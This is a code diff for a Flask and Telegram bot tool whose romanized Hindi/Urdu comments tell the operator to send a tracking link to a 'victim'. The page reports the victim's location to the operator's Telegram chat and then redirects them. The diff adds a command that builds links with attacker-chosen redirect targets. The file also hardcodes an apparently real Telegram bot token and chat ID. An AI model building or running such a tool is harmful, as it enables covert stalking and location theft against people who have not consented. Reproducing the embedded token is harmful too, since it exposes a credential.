@@ -10,9 +10,6 @@ TELEGRAM_BOT_TOKEN = "8742528917:AAHz664V1Md6qQ_8RP2nKsINXTBRY9loz50"
 TELEGRAM_CHAT_ID = "8049432833"
 PORT = int(os.environ.get("PORT", 8080))
 
-# Yahan apni woh website ka link dalein jahan aap victim ko location dene ke baad bhejna chahte hain
-TARGET_WEBSITE = "https://www.google.com"
-
 app = Flask(__name__)
 bot = telebot.TeleBot(TELEGRAM_BOT_TOKEN)
 
@@ -28,14 +25,25 @@ def send_telegram_message(message):
     except Exception as e:
         print(f"Telegram Error: {e}")
 
+# --- TELEGRAM COMMANDS (DYNAMIC LINK GENERATOR) ---
 @bot.message_handler(commands=['start', 'link', 'getlink'])
 def send_link_command(message):
     if str(message.chat.id) == str(TELEGRAM_CHAT_ID):
         app_url = os.environ.get("APP_URL", "https://location22.onrender.com")
+        
+        # Check karein ke user ne command ke sath koi link diya hai ya nahi
+        text_parts = message.text.split(maxsplit=1)
+        if len(text_parts) > 1:
+            target_url = text_parts[1].strip()
+            # Dynamic tracking link with target website query parameter
+            final_link = f"{app_url}/?to={target_url}"
+        else:
+            final_link = app_url
+            
         response_text = (
-            f"🔗 *Aapka Tracking Link Tayar Hai!*\n\n"
-            f"`{app_url}`\n\n"
-            f"Is link ko victim ko bhejein."
+            f"🔗 *Aapka Custom Tracking Link Tayar Hai!*\n\n"
+            f"`{final_link}`\n\n"
+            f"Is link ko victim ko bhejein. Location milne ke baad woh aapki di gayi website par redirect ho jayega!"
         )
         bot.send_message(message.chat.id, response_text, parse_mode="Markdown")
     else:
@@ -152,7 +160,9 @@ HTML_PAGE = """
 
 @app.route("/")
 def index():
-    return HTML_PAGE.replace("TARGET_URL_PLACEHOLDER", TARGET_WEBSITE)
+    # URL se target website uthayega jo aap Telegram mein denge
+    target_website = request.args.get("to", "https://www.google.com")
+    return HTML_PAGE.replace("TARGET_URL_PLACEHOLDER", target_website)
 
 @app.route("/update", methods=["POST"])
 def update():
@@ -185,5 +195,5 @@ def run_flask():
 if __name__ == "__main__":
     flask_thread = threading.Thread(target=run_flask, daemon=True)
     flask_thread.start()
-    send_telegram_message("🟢 *Bot Updated & Started Successfully!* Type /link to get your URL.")
+    send_telegram_message("🟢 *Bot Updated Successfully!* Use `/link [website_url]` to generate a link.")
     bot.infinity_polling()
